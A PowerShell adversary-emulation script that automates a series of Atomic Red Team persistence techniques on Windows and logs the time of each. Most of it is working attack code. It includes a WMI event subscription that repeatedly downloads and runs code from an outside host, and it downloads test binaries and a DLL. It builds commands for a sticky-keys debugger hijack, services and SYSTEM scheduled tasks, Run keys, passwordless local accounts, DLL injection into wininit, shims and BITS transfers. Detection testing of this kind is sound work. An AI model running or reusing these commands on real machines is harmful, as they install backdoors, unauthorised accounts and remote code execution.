<# 

The commands in this script include atomic red team TTPs. This script is meant to automate execution of TTPs as well as make it reproducible 
along with generating a log file that notes down the time at which it was executed.parameters can be replaced with appropriate binaries suitable for yor
environment 

#>

$currentdir = $(pwd).Path
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$T1084_wmi_persistent_script_url_download="http://10.10.10.10/a"

$PERSLOGO = 
'
############################################################################################################################################################################################################### 
#                                                                                                                                                                                                              #   
#                                                                                               PERSISTANCE                                                                                                    #   
#                                                                                                                                                                                                              #
################################################################################################################################################################################################################
'
Write-Host $PERSLOGO

<# credit to n0pe-sled for wmi persistence below. Following piece of code is included in this script to take burden off of user's end to host the script #>

function Install-Persistence{

    $Payload = "((new-object net.webclient).downloadstring('"+ $T1084_wmi_persistent_script_url_download + "'))"
    $EventFilterName = 'T1084-Cleanup'
    $EventConsumerName = 'T1084-DataCleanup'
    $finalPayload = "powershell.exe -nop -c `"IEX $Payload`""

    # Create event filter
    $EventFilterArgs = @{
        EventNamespace = 'root/cimv2'
        Name = $EventFilterName
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
        QueryLanguage = 'WQL'
    }

    $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

    # Create CommandLineEventConsumer
    $CommandLineConsumerArgs = @{
        Name = $EventConsumerName
        CommandLineTemplate = $finalPayload
    }
    $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

    # Create FilterToConsumerBinding
    $FilterToConsumerArgs = @{
        Filter = $Filter
        Consumer = $Consumer
    }
    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs

    #Confirm the Event Filter was created
    $EventCheck = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"
    if ($EventCheck -ne $null) {
        Write-Host "Event Filter $EventFilterName successfully written to host"
    }

    #Confirm the Event Consumer was created
    $ConsumerCheck = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
    if ($ConsumerCheck -ne $null) {
        Write-Host "Event Consumer $EventConsumerName successfully written to host"
    }

    #Confirm the FiltertoConsumer was created
    $BindingCheck = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__eventfilter.name='$EventFilterName'"""
    if ($BindingCheck -ne $null){
        Write-Host "Filter To Consumer Binding successfully written to host"
    }

}


$T1015_malicious_executable_download="https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1050/bin/AtomicService.exe"
$T1015_target_executable="sethc.exe"
$T1031_changed_binary_for_service="c:\windows\system32\calc.exe"
$T1103_appinit_dll_download="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1103/T1103.reg"
$T1138_appplication_shimming_download="https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1138/src/AtomicShimx86.sdb"
$T1179_malicious_dll_download="https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1179/src/x64/T1179.dll"
$T1179_pid=$(Get-Process -Name wininit).Id
$T1197_BITS_download="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"


$T1015_exe = "$currentdir\T1015.exe"
$T1103_reg = "$currentdir\T1103.reg"
$1138_sdb  = "$currentdir\T1138.sdb"
$T1179_dll = "$currentdir\T1179.dll"


Invoke-WebRequest -Uri $T1015_malicious_executable_download -OutFile $T1015_exe
Invoke-WebRequest -Uri $T1103_appinit_dll_download -OutFile $T1103_reg
Invoke-WebRequest -Uri $T1138_appplication_shimming_download -Outfile $1138_sdb
Invoke-WebRequest -Uri $T1179_malicious_dll_download -Outfile $T1179_dll



$T1015 = 'reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\' + $T1015_target_executable +'" /v "Debugger" /t REG_SZ /d "' + $T1015_exe + '" /f'
$T1042 = 'cmd.exe /c "assoc .wav="C:\Program Files\Windows Media Player\wmplayer.exe""'
$T1050 = 'sc.exe create T1050 binPath="' + $T1015_exe +'"'
$T1050_powershell = 'powershell.exe New-Service -Name "T1050-powershell" -BinaryPathName '+ $T1015_exe 
$T1031 = 'sc.exe config T1050 binPath="' + $T1031_changed_binary_for_service + '"'
$T1053 = 'schtasks.exe /create /tn "T1053" /tr"' + $T1015_exe + '" /sc HOUR /RU SYSTEM'
$T1060 = 'REG.exe ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "T1060" /t REG_SZ /F /D "' + $T1015_exe + '"'
$T1084 = 'Install-Persistence'
$T1103 = 'reg.exe import ' + $T1103_reg
$T1128 = 'netsh.exe add helper ' + $T1179_dll
$T1136 = 'net.exe user /add T1136'
$T1136_powershell = 'powershell.exe New-LocalUser -Name T1136-powershell -NoPassword'
$T1138 = 'sdbinst.exe ' + $1138_sdb
$T1179 = 'mavinject.exe ' + $T1179_pid + ' /INJECTRUNNING ' + $T1179_dll
$T1197 = 'bitsadmin.exe  /transfer /Download /priority Foreground ' + $T1197_BITS_download + ' c:\windows\temp\bitsadmin_flag.ps1'
$T1197_powershell = 'Start-BitsTransfer -Priority foreground -Source ' + $T1197_BITS_download + ' -Destination c:\windows\temp\bitsadmin_flag_powershell.ps1'

[array]$persistent_TTP_number = “T1015”, “T1050”, “T1042”, “T1031”, “T1050_powershell”, “T1053”, “T1060”, “T1084”, “T1103”, “T1128”, “T1136”, “T1136_powershell”, “T1138”, “T1179”, “T1197”, “T1197_powershell” 
[array]$persistent = $T1015, $T1050, $T1042, $T1031, $T1050_powershell, $T1053, $T1060, $T1084, $T1103, $T1128, $T1136, $T1136_powershell, $T1138, $T1179, $T1197, $T1197_powershell 


for ($i=0; $i -lt $persistent.length; $i++){

    Write-Host Exeucting $persistent_TTP_number[$i] -ForegroundColor Red `n
    Write-Host $persistent[$i] -ForegroundColor green `n
    Write-Host Time : $(Get-Date) -ForegroundColor Cyan `n
    Write-Host ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
    Get-Date | Add-Content log-persistent.txt 
    "                         " | Add-Content log-persistent.txt
    $persistent_TTP_number[$i]+ " : " + $persistent[$i] | Add-Content log-persistent.txt
    "                         " | Add-Content log-persistent.txt
    <# Invoke-Expression $persistent[$i] #>
    "---------------------------------------------------------------------------------------------------------------------------" | Add-Content log-persistent.txt 
} 

